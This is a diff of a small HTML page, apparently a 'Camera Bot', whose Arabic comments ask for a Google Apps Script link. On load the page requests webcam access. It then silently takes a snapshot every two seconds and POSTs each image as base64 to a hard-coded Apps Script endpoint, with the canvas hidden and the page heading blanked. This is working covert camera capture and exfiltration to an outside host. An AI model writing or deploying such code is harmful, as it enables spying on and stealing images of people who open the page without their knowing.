@@ -1,73 +1,73 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Snapshot</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        #canvas {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Camera Bot</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    #canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <h1>Camera Snapshot</h1>
-    <canvas id="canvas"></canvas>
+  <h1> </h1>
+  <canvas id="canvas"></canvas>
 
-    <script>
-        const canvas = document.getElementById("canvas");
+  <script>
+    const canvas = document.getElementById("canvas");
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzxiFav7UBtXjHOqZrTUuzaPTyNxKuIb-26J95QS549m4E9oY4RcB5AFF1uDjotT8sj1g/exec"; // 👈 ضع رابط Google Apps Script هنا
+ navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        const videoTrack = stream.getVideoTracks()[0];
+        setInterval(() => takeSnapshot(videoTrack), 2000);
+      })
+      .catch(function (error) {
+        console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
+      });
+
+    function takeSnapshot(videoTrack) {
+      const videoElement = document.createElement("video");
+      videoElement.srcObject = new MediaStream([videoTrack]);
+
+      videoElement.addEventListener("loadedmetadata", () => {
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+
         const ctx = canvas.getContext("2d");
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzxiFav7UBtXjHOqZrTUuzaPTyNxKuIb-26J95QS549m4E9oY4RcB5AFF1uDjotT8sj1g/exec';
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-        let videoStream;
+        canvas.toBlob(function (blob) {
+          const reader = new FileReader();
+          reader.onloadend = function () {
+            const base64 = reader.result.split(",")[1]; // بدون header
+            sendToGoogleScript(base64);
+          };
+          reader.readAsDataURL(blob);
+        }, "image/jpeg");
+      });
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                videoStream = stream;
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+      videoElement.play();
+    }
 
-                video.onplaying = () => {
-                    setInterval(function() {
-                        takeSnapshot(video);
-                    }, 2000);
-                };
-            })
-            .catch(function(error) {
-                console.error("حدث خطأ أثناء الوصول للكاميرا:", error);
-            });
+    function sendToGoogleScript(base64Image) {
+      const formData = new FormData();
+      formData.append("photo", base64Image);
 
-        function takeSnapshot(video) {
-            if (video.videoWidth === 0 || video.videoHeight === 0) return;
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(function(blob) {
-                const formData = new FormData();
-                formData.append('image', blob);
-
-                fetch(SCRIPT_URL, {
-                    method: "POST",
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(data => {
-                    console.log("تم إرسال الصورة:", data);
-                })
-                .catch(error => {
-                    console.error("خطأ في الإرسال:", error);
-                });
-            }, "image/jpeg", 0.8);
-        }
-    </script>
+      fetch(scriptURL, {
+        method: "POST",
+        body: formData
+      })
+        .then((response) => response.text())
+        .then((result) => console.log(result))
+        .catch((error) => console.error("❌ فشل الإرسال:", error));
+    }
+  </script>
 </body>
 </html>
